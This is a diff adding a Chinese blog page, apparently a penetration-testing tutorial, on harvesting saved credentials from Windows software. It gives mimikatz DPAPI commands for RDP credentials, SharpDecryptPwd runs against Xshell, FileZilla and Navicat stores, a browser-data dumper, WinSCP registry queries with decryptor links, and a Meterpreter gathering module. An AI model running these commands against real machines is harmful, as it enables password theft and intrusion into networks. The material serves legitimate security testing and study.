@@ -1,0 +1,230 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>内网渗透体系建设--第2章--内网资源探测--获取常见应用软件凭据 | he11的农场</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://dydydy123.github.io/favicon.ico?v=1686555449410">
+<link rel="stylesheet" href="https://dydydy123.github.io/styles/main.css">
+
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+
+
+
+    <meta name="description" content="为了扩大可访问的范围，测试人员会尝试搜搜各种常见的密码存储位置，像很多的软件就会存储密码。
+1.获取RDP保存的凭证
+经常使用RDP远程桌面连接远程服务器的用户可能勾选了保存连接凭证的选项，以便快速的身份验证。这些凭证使用数据保护API以加..." />
+    <meta name="keywords" content="" />
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://dydydy123.github.io">
+        <img src="https://dydydy123.github.io/images/avatar.png?v=1686555449410" class="site-logo">
+        <h1 class="site-title">he11的农场</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="site-nav">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            标签
+          </a>
+        
+      
+        
+          <a href="/post/about" class="site-nav">
+            关于
+          </a>
+        
+      
+        
+          <a href="https://dydydy123.github.io/post/you-lian" class="site-nav">
+            友链
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      ganma~~~~~~~~~~
+    </div>
+    <div class="site-footer">
+       | <a class="rss" href="https://dydydy123.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">内网渗透体系建设--第2章--内网资源探测--获取常见应用软件凭据</h2>
+            <div class="post-date">2023-04-02</div>
+            
+            <div class="post-content" v-pre>
+              <p>为了扩大可访问的范围，测试人员会尝试搜搜各种常见的密码存储位置，像很多的软件就会存储密码。<br>
+<strong>1.获取RDP保存的凭证</strong><br>
+经常使用RDP远程桌面连接远程服务器的用户可能勾选了保存连接凭证的选项，以便快速的身份验证。这些凭证使用数据保护API以加密形式存储在Windows的凭证管理器中，在<code>%USERPROFILE%\AppData\Local\Microsoft\Credentials</code>目录</p>
+<pre><code>cmdkey /list #查看当前保存的凭据
+dir /a %USERPROFILE%\AppData\Local\Microsoft\Credentials\*   #遍历Credentials目录下保存的历史连接凭据数据
+</code></pre>
+<p>Mimikatz导出Credentials目录下保存的历史连接凭据（加密的RDP凭据）：</p>
+<pre><code>mimikatz.exe &quot;privilege::debug&quot; &quot;dpapi::cred /in:%USERPROFILE%\AppData\Local\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D&quot; exit    #使用mimikatz解析指定的连接凭据
+</code></pre>
+<p>得到pdData就是凭据的加密数据，guidMasterkey是该凭据的GUID，记录guidMasterkey。执行以下命令：</p>
+<pre><code>mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::dpapi&quot; exit   #找到与guidMasterKey(GUID)相关联的MasterKey
+</code></pre>
+<p>记录MasterKey，执行以下命令：</p>
+<pre><code>mimikatz.exe &quot;dpapi::cred /in:%USERPROFILE%\AppData\Local\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D/masterkey:c33afd208e2f69c975b90546deedc8091c47eab49fb96a9c3092373f276a85dcf90d41e072eb4a105599244876b686c145f5bd2f00ffc12cac2e7faace661733&quot; exit
+</code></pre>
+<p>使用MasterKey值破解指定的凭据文件DFBE70A7E5CC19A398EBF1B96859CE5D，获得RDP明文凭据。</p>
+<p><strong>2.获取Xahell保存的凭证</strong></p>
+<p>Xshell会将服务器连接信息保存在Session目录下的.xsh文件中, 如果用户在连接的时候勾选了记住用户名/密码, 该文件会保存远程服务器连接的用户名和结果加密后的密码</p>
+<pre><code>Xshell版本	.xsh文件路径
+Xshell5	%USERPROFILE%\Documents\NetSarang\Xshell\Sessions
+Xshell6	%USERPROFILE%\Documents\NetSarang Computers\6\Xshell\Sessions
+Xshell7	%USERPROFILE%\Documents\NetSarang Computers\7\Xshell\Sessions
+</code></pre>
+<p>获取Xshell保存的凭据：</p>
+<pre><code>SharpDecryptPwd.exe -Xmangager -p &quot;%USERPROFILE%\Documents\NetSarang\Xshell\Sessions&quot;   #获取Xshell5的账密
+SharpDecryptPwd.exe -Xmangager -p &quot;%USERPROFILE%\Documents\NetSarang Computers\6\Xshell\Sessions&quot;  #获取Xshell6的账密
+</code></pre>
+<p>Xshell5和6可以通过工具SharpDecryptPwd解密, 除此之外该工具还可以解密Navicate、TeamViewer、FileZilla、WinSCP、Xmangager系列产品。Xshell7后的版本通过上面命令获得的密码为一串乱码,只能使用星号密码查看器直接查看密码。</p>
+<p><strong>3.获取FileZilla保存的凭证</strong><br>
+FileZilla用于FTP连接, 它会将FTP登录凭据以base64密文的格式保存在<code>%USERPROFILE%\AppData\Roaming\FileZilla\recentservers.xml</code>文件中, 可以使用SharpDecryptPwd直接一键导出FileZilla保存的凭据。<br>
+&lt;\User&gt;节点记录了FTP登录用户，&lt;\Pass&gt;节点记录Base64编码的用户密码。</p>
+<p><code>SharpDecryptPwd</code>--https://github.com/uknowsec/SharpDecryptPwd</p>
+<pre><code>SharpDecryptPwd.exe -FileZilla
+</code></pre>
+<p><strong>4.获取Navicat保存的凭证</strong><br>
+数据库类型	凭据存储路径(注册表)</p>
+<pre><code>Mysql	HKEY_CURRENT_USER\Software\PremiumSoft\Navicat\Server\&lt; Connetion Name&gt;
+MariaDB	HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMARIADB\Servers\&lt; Connetion Name&gt;
+MongoDB	HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMONGODB\Servers\&lt; Connetion Name&gt;
+SQL SERVER	HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMSSQL\Servers\&lt; Connetion Name&gt;
+Oracle	HKEY_CURRENT_USER\Software\PremiumSoft\NavicatOra\Servers\&lt; Connetion Name&gt;
+PostgreSQL	HKEY_CURRENT_USER\Software\PremiumSoft\NavicatPG\Servers\&lt; Connetion Name&gt;
+SQLite	HKEY_CURRENT_USER\Software\PremiumSoft\NavicatSQLite\Servers\&lt; Connetion Name&gt;
+</code></pre>
+<p>Navicat的注册表中记录了保存密码的连接数据, 包括IP,用户名,密码,连接数据库名,数据库类型等, 其中密码字段是结果可你算法加密后再保存的, 其中Navicat&lt;=11版本和Navicat&gt;=12版本分别使用不同的加密算法。</p>
+<pre><code>SharpDecryptPwd.exe -NavicatCrypto
+</code></pre>
+<p><strong>5.获取浏览器保存的凭证</strong></p>
+<pre><code>hack-browser-data.exe
+</code></pre>
+<p>会将相关的数据导出到当前目录下的./result目录下</p>
+<p><strong>6.获取WinSCP保留的登录凭据</strong><br>
+WinSCP默认安装在<code>C:\Program Files (x86)\WinSCP</code>，其用户凭证可以保存在注册表或者配置文件中。</p>
+<p>配置文件则在<code>C:\Program Files (x86)\WinSCP\WinSCP.ini</code>或<br>
+<code>C:\Users\USERNAME\AppData\Local\VirtualStore\Program Files (x86)\WinSCP\WinSCP.ini</code></p>
+<pre><code>解密工具或脚本：
+
+https://bitbucket.org/knarf/winscppwd/downloads/winscppwd.exe
+
+https://raw.githubusercontent.com/anoopengineer/winscppasswd/master/main.go
+
+https://raw.githubusercontent.com/YuriMB/WinSCP-Password-Recovery/master/src/main/java/Main.java
+</code></pre>
+<pre><code>注册表查询命令
+查询注册表中winscp保存的密文
+
+shell reg query &quot;HKEY_CURRENT_USER\Software\Martin Prikryl\WinSCP 2\Sessions&quot;shell reg query &quot;HKEY_CURRENT_USER\Software\Martin Prikryl\WinSCP 2\Sessions\root@192.168.80.164&quot;
+
+
+使用winscppwd.exe进行解密
+winscppwd.exe root 192.168.80.164 A35C4A54D144F65B7DF0E8F42E3333286D656E726D6A6472646C726D6A682833332EFA7A248229B891A201911C3F588380D6
+
+Winscppwd.exe WinSCP.ini
+
+
+msf模块
+meterpreter &gt; run post/windows/gather/credentials/winscp
+</code></pre>
+
+            </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://dydydy123.github.io/post/nei-wang-shen-tou-ti-xi-jian-she-di-2-zhang-nei-wang-zi-yuan-tan-ce-yong-hu-ping-zheng-shou-ji/">
+                  <h3 class="post-title">
+                    内网渗透体系建设--第2章--内网资源探测--用户凭证收集
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+<script type="application/javascript">
+
+AOS.init();
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+  <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  <script>
+    hljs.initHighlightingOnLoad()
+  </script>
+
+
+
+
+
+  </body>
+</html>
